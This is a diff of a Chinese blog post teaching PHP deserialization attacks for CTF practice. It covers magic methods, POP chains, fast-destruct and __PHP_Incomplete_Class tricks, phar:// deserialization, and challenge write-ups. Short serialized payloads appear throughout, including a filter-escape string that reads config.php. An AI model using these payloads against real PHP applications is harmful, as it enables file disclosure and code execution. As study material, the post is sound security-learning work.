@@ -485,21 +485,21 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-10-28
+                    2023-04-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.4k
+                    7.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    31 分
+                    35 分
                 </div>
                 
 
@@ -522,7 +522,7 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>php的序列化和反序列化主要是通过serialize和unserialize两个函数</p>
+                <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>php的序列化和反序列化主要是通过serialize和unserialize两个函数</p>
 <p>serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法</p>
  <span id="more"></span>
 
@@ -533,7 +533,7 @@ __toString：当对象被当做一个字符串使用时调用。
 __sleep:序列化对象之前就调用此方法(其返回需要一个数组)
 __wakeup:反序列化恢复对象之前调用该方法
 __call:当调用对象中不存在的方法会自动调用该方法。
-__get:在调用b私有属性的时候会自动执行
+__get:在调用不可访问的属性的时候会自动执行(私有，或不存在)
 __isset()在不可访问的属性上调用isset()或empty()触发
 __invoke()	当尝试把对象当方法调用时调用。
 __unset()在不可访问的属性上使用unset()时触发</code></pre>
@@ -552,18 +552,107 @@ __unset()在不可访问的属性上使用unset()时触发</code></pre>
 <p>__toString 当一个对象被当做字符串使用<br>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用<br>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p>
 <p><strong>反序列化的常见终点:</strong></p>
 <p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p>
-<h3 id="POP链简介"><a href="#POP链简介" class="headerlink" title="POP链简介"></a><strong>POP链简介</strong></h3><p>借鉴的文章：</p>
+<h1 id="POP链简介"><a href="#POP链简介" class="headerlink" title="POP链简介"></a><strong>POP链简介</strong></h1><p>借鉴的文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/16c56bebc63d">php反序列化利用——POP链构造实例 - 简书 (jianshu.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/105265462">(1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链</a></p>
 <p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p>
-<h3 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h3><p>1、一些有用的POP链中出现的方法：</p>
-<pre class="language-php" data-language="php"><code class="language-php">- 命令执行：exec()、passthru()、popen()、system()
+<h1 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h1><p>1、一些有用的POP链中出现的方法：</p>
+<pre class="language-php" data-language="php"><code class="language-php">- 命令执行：exec()、passthru()、popen()、system()、eval()
 - 文件操作：file_put_contents()、file_get_contents()、unlink()</code></pre>
 
 <p>2、<strong>反序列化中为了避免信息丢失，使用大写S支持字符串的编码。</strong>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p>
 <pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre>
 
 <p>3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br> 4、配合PHP伪协议实现文件包含、命令执行等漏洞。</p>
+<h1 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h1><blockquote>
+<p>1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
+<p>2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。</p>
+</blockquote>
+<p>fast destruct就是为了解决第二个问题的，让反序列化提前执行。</p>
+<p>方法就是破坏反序列化后数据的结构，导致提前进入destruct方法</p>
+<p>应用场景：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+error_reporting(0);
+
+class superGate&#123;
+    public $gay &#x3D; true;
+
+    function __destruct()&#123;
+        echo file_get_contents(&quot;&#x2F;flag&quot;);
+        die();
+    &#125;
+&#125;
+
+$p &#x3D; $_GET[&#39;p&#39;];
+$honey &#x3D; unserialize($p);
+if(preg_match(&quot;&#x2F;superGate&#x2F;i&quot;, serialize($honey)))&#123;
+    echo &quot;no&quot;;
+    throw Exception();
+&#125;
+
+show_source(__FILE__);</code></pre>
+
+<p>如果正常进行序列化，在调用__destruct之前，我们序列化的内容就以及被if判断给抛出异常了</p>
+<p>具体实现：</p>
+<p>1.采用数组的方式（感觉局限性很大</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+error_reporting(0);
+
+class superGate&#123;
+    public $gay &#x3D; true;
+
+    function __destruct()&#123;
+        echo 1111;
+&#x2F;&#x2F;        die();
+    &#125;
+&#125;
+class a&#123;
+    public $gay &#x3D; true;
+&#125;
+
+&#x2F;&#x2F;$p &#x3D; &#39;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;&#39;;
+&#x2F;&#x2F;$q &#x3D; serialize(array(0 &#x3D;&gt; new superGate(),1&#x3D;&gt;new a(),3&#x3D;&gt;&#39;&#39;));#得到结果之后把索引改了，这样在反序列化的时候会因为有两个一样的索引，导致覆盖前边的内容，让前边的内容提前销毁
+&#x2F;&#x2F;echo $q;
+$honey &#x3D; unserialize(&#39;a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:0;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;&#39;);
+if(preg_match(&quot;&#x2F;superGate&#x2F;i&quot;, serialize($honey)))&#123;
+    echo &quot;no&quot;;
+    throw Exception();
+&#125;</code></pre>
+
+<p>2.</p>
+<p>破坏序列化结构，比如修改个数，或者去掉最后边的一个大括号</p>
+<h1 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h1><p>在PHP中，当我们在反序列化一个不存在的类时，就比如这个<code>a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:1;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;</code></p>
+<p>结果会变为</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230410212601861.png" alt="image-20230410212601861"></p>
+<p>类名被__PHP_Incomplete_Class 代替了，而原有的类名被存放到了__PHP_Incomplete_Class_Name里</p>
+<p>可是如果这时候再将这个内容进行序列化</p>
+<p>得到的还是正常格式的序列化字符串<code>a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:1;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;</code></p>
+<p>可是假设我们构造的payload是<code>a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;abc&quot;;s:5:&quot;aaaaa&quot;;&#125;&#125;</code></p>
+<p>那么在反序列化时得到的结果就是</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230410214158351.png" alt="image-20230410214158351"></p>
+<p>这时候再进行二次序列化得到的就变成了<code>a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&#125;</code>由于没有找到__PHP_Incomplete_Class_Name绑定的类名，所以后边的东西被丢弃了</p>
+<p><strong>例题</strong></p>
+<p>强网杯2021 WhereIsUWebShell </p>
+<h1 id="利用phar协议实现反序列化漏洞攻击"><a href="#利用phar协议实现反序列化漏洞攻击" class="headerlink" title="利用phar协议实现反序列化漏洞攻击"></a>利用phar协议实现反序列化漏洞攻击</h1><p><strong>漏洞成因</strong> </p>
+<p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
+<p>原理分析 </p>
+<p>phar的组成</p>
+<p>通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是<code>stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)</code> 下面进行解释一下；</p>
+<p>1 .0  a stub</p>
+<p>标识作用，格式为</p>
+<pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre>
+
+<p>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p>
+<p>2 .0 </p>
+<p>a manifest describing the contents</p>
+<p>其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p>
+<p>3 .0 the file contents</p>
+<p>这里指的是被压缩文件的内容；</p>
+<p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p>
+<p>签名，放在结尾；</p>
 <h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p>(这里放一下自己做过的反序列化题，持续更新.jpg</p>
 <h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p>
 <p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p>
@@ -894,7 +983,7 @@ if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163626344.png" alt="image-20210903163626344"></p>
 <p>再看其他的内容</p>
 <p>profile.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    require_once(&#39;class.php&#39;);
    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
       die(&#39;Login First&#39;);    
@@ -913,7 +1002,7 @@ if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;
 ?&gt;</code></pre>
 
 <p>class.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 require(&#39;config.php&#39;);
 
 class user extends mysql&#123;
@@ -1015,7 +1104,7 @@ $user &#x3D; new user();
 $user-&gt;connect($config);</code></pre>
 
 <p>update.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    require_once(&#39;class.php&#39;);
    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
       die(&#39;Login First&#39;);    
@@ -1049,7 +1138,7 @@ $user-&gt;connect($config);</code></pre>
 ?&gt;</code></pre>
 
 <p>config.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;
    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;
    $config[&#39;password&#39;] &#x3D; &#39;&#39;;
@@ -1059,16 +1148,16 @@ $user-&gt;connect($config);</code></pre>
 
 <p>profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile);</p>
 <p>所以再根据</p>
-<pre class="language-none"><code class="language-none">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+<pre class="language-php" data-language="php"><code class="language-php">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
      return preg_replace($safe, &#39;hacker&#39;, $string);
   &#125;</code></pre>
 
 <p>可以进行反序列化字符逃逸</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903162948758.png" alt="image-20210903162948758"></p>
-<pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre>
+<pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre>
 
-<p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过</p>
+<p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过，由于成数组了，所以才要在where后边加个;}</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163055572.png" alt="image-20210903163055572"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220516175618670.png" alt="image-20220516175618670"></p>
 <p>看一下这个your profile页面</p>
@@ -1079,13 +1168,13 @@ $user-&gt;connect($config);</code></pre>
 <h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>文件上传，但是这个flie参数感觉可以直接文件读取</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125203202419.png" alt="image-20211125203202419"></p>
 <p>index.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php 
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
 header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  
 include &#39;base.php&#39;;
 ?&gt; </code></pre>
 
 <p>base.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php 
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
     session_start(); 
 ?&gt; 
 &lt;!DOCTYPE html&gt; 
@@ -1117,7 +1206,7 @@ include &#39;base.php&#39;;
 &lt;!--flag is in f1ag.php--&gt;</code></pre>
 
 <p>file.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php 
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
 header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  
 include &#39;function.php&#39;; 
 include &#39;class.php&#39;; 
@@ -1288,26 +1377,7 @@ class Test
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125204709437.png" alt="image-20211125204709437"></p>
 <p>肯定是用这个函数来读取flag文件，但是没有反序列化的地方</p>
-<p>加个新知识</p>
-<p><strong>利用phar协议实现反序列化漏洞攻击</strong></p>
-<p><strong>漏洞成因</strong> </p>
-<p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
-<p>原理分析 </p>
-<p>phar的组成</p>
-<p>通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是<code>stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)</code> 下面进行解释一下；</p>
-<p>1 .0  a stub</p>
-<p>标识作用，格式为</p>
-<pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre>
-
-<p>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p>
-<p>2 .0 </p>
-<p>a manifest describing the contents</p>
-<p>其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p>
-<p>3 .0 the file contents</p>
-<p>这里指的是被压缩文件的内容；</p>
-<p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p>
-<p>签名，放在结尾；</p>
+<p>所以这里要用phar反序列化</p>
 <p><strong>C1e4r类中有__destruct(),</strong></p>
 <p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。</p>
 <p>函数中发现了echo，那么要利用echo $this-&gt;test。</p>
@@ -1365,7 +1435,6 @@ $phar-&gt;stopBuffering();
 compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;    版本：都可以
 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</code></pre>
 
-<h2 id><a href="#" class="headerlink" title></a></h2>
                 
             </div>
             <hr/>
@@ -2162,7 +2231,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">195.4k</span>
+                        class="white-color">231k</span>
             
             
             
